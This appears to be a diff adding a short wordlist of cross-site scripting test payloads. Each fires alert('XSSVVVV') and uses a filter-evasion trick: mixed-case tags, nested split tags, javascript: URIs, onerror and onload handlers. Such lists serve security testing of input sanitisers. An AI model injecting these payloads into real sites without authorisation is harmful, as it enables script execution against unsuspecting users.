@@ -1,0 +1,11 @@
+<ScrIpt>alert('XSSVVVV')</scRiPt>
+<sc<script>ript>alert('XSSVVVV')<</script>/script>
+<scscriPtript>alert('XSSVVVV')</scrscRiptipt>
+<ImG SRC=JaVaScRiPt:alert('XSSVVVV')
+<ImG """><SCRIPT>alert("XSSVVVV")</SCRIPT>">
+<ImG src = XVVVV.jpg onerror="javascript:alert('XSSVVVV')"/>
+<ImG DYNSRC="javascript:alert('XSSVVVV')">
+</TITLE><SCRIPT>alert("XSSVVVV");</SCRIPT>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSSVVVV');">
+<BODY ONLOAD=alert('XSSVVVV')>
+<BODY BACKGROUND="javascript:alert('XSSVVVV')">
